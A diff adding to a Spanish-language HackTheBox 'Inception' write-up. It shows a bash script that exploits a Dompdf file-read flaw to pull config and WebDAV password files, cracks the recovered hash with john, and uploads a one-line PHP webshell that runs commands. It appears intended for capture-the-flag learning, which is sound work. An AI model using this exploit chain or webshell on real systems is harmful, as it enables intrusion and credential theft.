@@ -76,3 +76,113 @@ cobb:x:1000:1000::/home/cobb:/bin/bash
 ```
 Identificamos un usuario llamado `cobb` 
 Ahora que tenemos la vulnerabilidad de leer archivos de la maquina victima vamos a buscar por recursos interesantes en el sistema.
+
+Enumerando el sistema atraves de un script en bash
+```bash
+───────┬────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
+       │ File: Dompdf-RemoteFileRead.sh
+───────┼────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
+   1   │ #/bin/bash
+   2   │ 
+   3   │ # Arbitrary File Read Machine Inception HTB HacktheBox
+   4   │ 
+   5   │ file='$1'
+   6   │ 
+   7   │ if file != '$0' 2>/dev/null; then
+   8   │ 
+   9   │     curl -s -X GET "10.10.10.67/dompdf/dompdf.php?input_file=php://filter/read=convert.base64-encode/resource=$1" | grep -E '[.*?]' | grep -v  '%' | grep -v  '/MediaBox' | grep -v '0.000' | awk '{print $
+       │ 8}' | tr -d '[()]' | base64 -d
+  10   │ 
+  11   │ fi
+───────┴────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
+``` 
+Procedemos a enumerar el la ruta `/etc/sites-availble/`
+```bash
+# ./Dompdf-RemoteFileRead.sh /etc/apache2/sites-available/000-default.conf                                                                                                                                 
+<VirtualHost *:80>
+        # The ServerName directive sets the request scheme, hostname and port that
+        # the server uses to identify itself. This is used when creating
+        # redirection URLs. In the context of virtual hosts, the ServerName
+        # specifies what hostname must appear in the request's Host: header to
+        # match this virtual host. For the default virtual host (this file) this
+        # value is not decisive as it is used as a last resort host regardless.
+        # However, you must set it for any further virtual host explicitly.
+        #ServerName www.example.com
+
+        ServerAdmin webmaster@localhost
+        DocumentRoot /var/www/html
+
+        # Available loglevels: trace8, ..., trace1, debug, info, notice, warn,
+        # error, crit, alert, emerg.
+        # It is also possible to configure the loglevel for particular
+        # modules, e.g.
+        #LogLevel info ssl:warn
+
+        ErrorLog ${APACHE_LOG_DIR}/error.log
+        CustomLog ${APACHE_LOG_DIR}/access.log combined
+
+        # For most configuration files from conf-available/, which are
+        # enabled or disabled at a global level, it is possible to
+        # include a line for only one particular virtual host. For example the
+        # following line enables the CGI configuration for this host only
+        # after it has been globally disabled with "a2disconf".
+        #Include conf-available/serve-cgi-bin.conf
+        Alias /webdav_test_inception /var/www/html/webdav_test_inception
+        <Location /webdav_test_inception>
+                Options FollowSymLinks
+                DAV On
+                AuthType Basic
+                AuthName "webdav test credential"
+                AuthUserFile "/var/www/html/webdav_test_inception/webdav.passwd"
+                Require valid-user
+        </Location>
+</VirtualHost>
+
+# vim: syntax=apache ts=4 sw=4 sts=4 sr noet
+```
+
+Encontramos la ruta a  `/webdav_test_inception/webdav.passwd`
+Usamos nuestro script para visualizar el archivo en la ruta `/var/www/html/webdav_test_inception/webdav.passwd`
+```bash
+# ./Dompdf-RemoteFileRead.sh /var/www/html/webdav_test_inception/webdav.passwd                                                                                                   
+
+"webdav_tester": "$apr1$8rO7Smi4$yqn7H.GvJFtsTou1a7VME0"
+```
+Encontramos un hash que vamos a intentar romper con john:
+```bash
+# john --wordlist=/usr/share/wordlists/rockyou.txt hash
+# john --show hash                                                                                                                                                               
+
+"webdav_tester": "babygurl69"
+
+1 password hash cracked, 0 left
+```
+
+Como vemos tenemos un webdav podemos intentar usar la herramienta `cadaver` para subir archivos atraves del `webdav`
+```bash
+cadaver http://10.10.10.67/webdav_test_inception/
+Nombre de usuario: webdav_tester
+Contraseña: 
+
+dav:/webdav_test_inception/> ls
+Listando colección `/webdav_test_inception/': exitoso.
+        webdav.passwd                         52  nov  8  2017
+
+dav:/webdav_test_inception/> put webshell.php
+Transferiendo webshell.php a '/webdav_test_inception/webshell.php':
+ Progreso: [                              ]   0,0% of 36 bytes Progreso: [=============================>] 100,0% of 36 bytes exitoso.
+```
+
+Nos subimos el siguiente script en `webshell.php`
+```bash
+# cat webshell.php                                                                                                                                                              
+<?php
+        system($_REQUEST['cmd']);
+?>
+```
+
+Nos autenticamos al webdav por http y procedemos a apuntar al script webshell.php almacenado en el webdav
+```bash
+http://10.10.10.67/webdav_test_inception/webshell.php?cmd=whoami
+www-data
+```
